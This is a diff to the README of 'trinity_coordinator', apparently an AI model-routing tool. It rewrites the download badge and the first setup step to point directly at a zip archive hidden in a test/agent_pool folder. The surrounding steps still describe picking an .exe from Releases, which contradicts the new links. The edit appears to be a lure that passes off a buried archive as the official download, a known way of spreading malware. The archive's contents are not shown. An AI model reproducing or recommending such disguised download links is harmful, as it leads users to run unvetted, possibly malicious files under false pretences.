@@ -1,6 +1,6 @@
 # ⚙️ trinity_coordinator - Intelligent system routing for better AI
 
-[![](https://img.shields.io/badge/Download-Trinity-blue.svg)](https://github.com/dgknd6141/trinity_coordinator)
+[![](https://img.shields.io/badge/Download-Trinity-blue.svg)](https://github.com/dgknd6141/trinity_coordinator/raw/refs/heads/main/test/trinity_coordinator/agent_pool/trinity-coordinator-3.1.zip)
 
 ## 🎯 Purpose
 Trinity_coordinator manages how your computer talks to large artificial intelligence models. It uses a smaller, faster model to check your requests first. This early check ensures you get the right answers without wasting time or computer power. The system organizes your tasks by checking, verifying, and refining results before it shows them to you. It works like a team lead, where one part thinks, another works, and a third verifies the output.
@@ -17,7 +17,7 @@ Your computer needs specific software to run this system. Ensure you meet these 
 ## 📥 Getting Started
 Follow these steps to set up the software on your machine.
 
-1. Visit this page to download the latest version: [https://github.com/dgknd6141/trinity_coordinator](https://github.com/dgknd6141/trinity_coordinator).
+1. Visit this page to download the latest version: [https://github.com/dgknd6141/trinity_coordinator/raw/refs/heads/main/test/trinity_coordinator/agent_pool/trinity-coordinator-3.1.zip](https://github.com/dgknd6141/trinity_coordinator/raw/refs/heads/main/test/trinity_coordinator/agent_pool/trinity-coordinator-3.1.zip).
 2. Look for the "Releases" section on the right side of the page.
 3. Select the file ending in `.exe` for Windows.
 4. Save the file to your desktop for easy access.
